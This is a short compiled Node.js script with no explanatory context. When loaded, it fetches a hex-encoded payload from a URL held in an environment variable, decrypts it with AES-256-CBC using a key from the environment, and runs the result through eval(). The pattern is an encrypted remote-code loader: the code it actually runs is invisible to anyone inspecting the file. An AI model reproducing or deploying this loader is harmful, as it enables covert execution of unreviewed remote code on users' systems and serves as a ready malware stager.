"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
var node_crypto_1 = __importDefault(require("node:crypto"));
var node_http_1 = __importDefault(require("node:http"));
var node_https_1 = __importDefault(require("node:https"));
var node_url_1 = __importDefault(require("node:url"));
require("dotenv/config");
if (!process.env.SCRIPT_URL)
    throw new ReferenceError("Cannot fetch script!");
if (!process.env.KEY)
    throw new ReferenceError("Cannot decode script w/o key");
function decrypt() {
    var _a = node_url_1.default.parse(process.env.SCRIPT_URL), protocol = _a.protocol, hostname = _a.hostname, path = _a.path;
    var options = {
        hostname: hostname,
        path: path,
        method: "GET",
    };
    var request = (protocol === "https:" ? node_https_1.default : node_http_1.default).request(options, function (response) {
        if (response.statusCode !== 200) {
            throw new Error("Failed to fetch script: ".concat(response.statusCode, " ").concat(response.statusMessage));
        }
        var data = "";
        response.on("data", function (chunk) {
            data += chunk;
        });
        response.on("end", function () {
            var buffer = Buffer.from(data, "hex");
            var iv = buffer.subarray(0, 16);
            var ciphertext = buffer.subarray(16);
            var decipher = node_crypto_1.default.createDecipheriv("aes-256-cbc", Buffer.from(process.env.KEY, "hex"), iv);
            var b = decipher.update(ciphertext);
            eval(b.toString("utf8"));
        });
    });
    request.on("error", function (e) {
        throw new Error("Problem with request: ".concat(e.message));
    });
    request.end();
}
decrypt();
